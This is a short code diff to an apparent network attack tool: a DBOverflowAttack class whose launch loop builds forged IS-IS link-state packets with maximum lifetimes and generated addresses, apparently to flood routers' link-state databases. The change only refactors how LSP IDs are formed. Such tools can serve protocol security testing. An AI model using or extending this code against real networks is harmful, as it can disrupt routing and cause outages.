@@ -16,13 +16,14 @@ class DBOverflowAttack(BaseAttack):
         self._sender = PacketSender(
             iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
         )
+        self._lsp_prefix = f"{self.config.sys_id}."
 
     def launch(self) -> AttackResult:
         for i in range(self.config.lsp_count):
             frag_id = f"{i:02X}"
             pkt = build_lsp_with_tlvs(
                 sys_id=self.config.sys_id,
-                lsp_id=f"{self.config.sys_id}.{frag_id}-00",
+                lsp_id=self._lsp_prefix + f"{frag_id}-00",
                 src_mac=self._src_mac, level=self.config.level,
                 sequence=1, remaining_lifetime=65535,
                 network_addr=f"10.{i // 256}.{i % 256}.0",
